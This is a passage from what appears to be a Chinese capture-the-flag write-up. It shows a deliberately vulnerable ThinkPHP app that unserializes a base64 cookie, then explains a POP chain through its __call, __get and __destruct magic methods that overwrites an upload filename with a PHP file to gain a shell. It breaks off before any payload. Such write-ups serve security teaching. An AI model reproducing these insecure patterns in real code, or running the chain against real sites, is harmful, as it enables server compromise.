class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile_db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_upload_img</span>())&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&quot;username&quot;</span>,<span class="variable">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;upload&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&quot;img&quot;</span>,<span class="variable">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&quot;username&quot;</span>,<span class="variable">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;home&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$profile</span>=<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$profile</span>));</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile_db=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">array_diff</span>(<span class="variable">$this</span>-&gt;profile_db,<span class="variable">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="keyword">new</span> <span class="title class_">Index</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upload_menu=<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;../public/upload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext_check</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="variable">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;ID&#x27;</span>])-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$user_info</span>[<span class="string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="variable language_">$this</span>-&gt;img)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;ID&#x27;</span>,<span class="variable">$user_info</span>[<span class="string">&#x27;ID&#x27;</span>])-&gt;<span class="title function_ invoke__">data</span>([<span class="string">&quot;img&quot;</span>=&gt;<span class="title function_ invoke__">addslashes</span>(<span class="variable">$this</span>-&gt;img)])-&gt;<span class="title function_ invoke__">update</span>())&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_cookie</span>();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Upload img successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Upload file failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="variable language_">$this</span>-&gt;img;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ext_arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext=<span class="title function_ invoke__">end</span>(<span class="variable">$ext_arr</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext==<span class="string">&quot;png&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="keyword">new</span> <span class="title class_">Index</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;checker) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;post.username&quot;</span>)) &amp;&amp; !<span class="keyword">empty</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;post.email&quot;</span>)) &amp;&amp; !<span class="keyword">empty</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;post.password&quot;</span>))) &#123;</span><br><span class="line">            <span class="variable">$email</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;post.email&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;post.password&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);</span><br><span class="line">            <span class="variable">$username</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;post.username&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_email</span>(<span class="variable">$email</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">find</span>()) &amp;&amp; <span class="keyword">empty</span>(<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>, <span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>())) &#123;</span><br><span class="line">                    <span class="variable">$user_info</span> = [<span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$email</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>), <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$user_info</span>)) &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;registed = <span class="number">1</span>;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Registed successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Registed failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Account already exists!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Email illegal!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Something empty!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span>(<span class="params"><span class="variable">$email</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$email</span>, <span class="variable">$matches</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$matches</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是一个thinkphp的项目，app里一共有四个类，处理逻辑主要在index.php中<br>程序自带2个断点，应该是给我们标出了重要的地方：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673003948804-ecc81d91-7d25-4448-b713-db03edc3d88e.png" alt="image.png"><br>分别在index，register文件下，可以看到有unserialize函数，程序的正常逻辑首先是要注册，然后登录，登录过后还得上传一个图片文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673004015411-b3691e01-14b0-40a7-8822-f669c97a738e.png" alt="image.png"><br>不过可以绕过，上传完成图片后，才能进入个人资料界面，并且会将数据序列化+base64之后存进cookie里，也是在上面一段代码中，对文件名处理后覆盖了原来的文件<br>逻辑搞懂了之后就来看反序列化入口在哪<br>在Profile.php中有2个魔术方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673004093113-990a907a-6e71-46b1-a4ea-8b65b377aed4.png" alt="image.png"><br>逻辑是，get方法会从except数组中返回你所请求的属性；call方法以<code>this-&gt;&#123;$name&#125;</code>为方法名，执行这个方法<br>在register.php中又有析构方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673004185234-c4b52360-7b31-4c5a-a587-b32382958774.png" alt="image.png"><br>会调用自身checker属性的index方法，在这里不难知道pop链：<br>首先触发Profile类里的__call魔术方法，call方法中<code>this-&gt;&#123;$name&#125;</code>又会触发__get方法，因此只需在except数组中存一个键值对<code>[&quot;index&quot;=&gt;&quot;img&quot;]</code>，然后让img属性为<code>&quot;upload_img&quot;</code>,这样就会调用upload_img方法，在这由于是反序列化没上传文件，所以<code>if(!empty($_FILES))</code>就被绕过去了，不会进入if里面的内容<br>直接进入文件覆盖环节，在这我们只需要让filename属性等于我们的<code>./upload/xxx/xxx.php</code>即可完成上传php文件，之后getshell<br>直接放pop：</p>
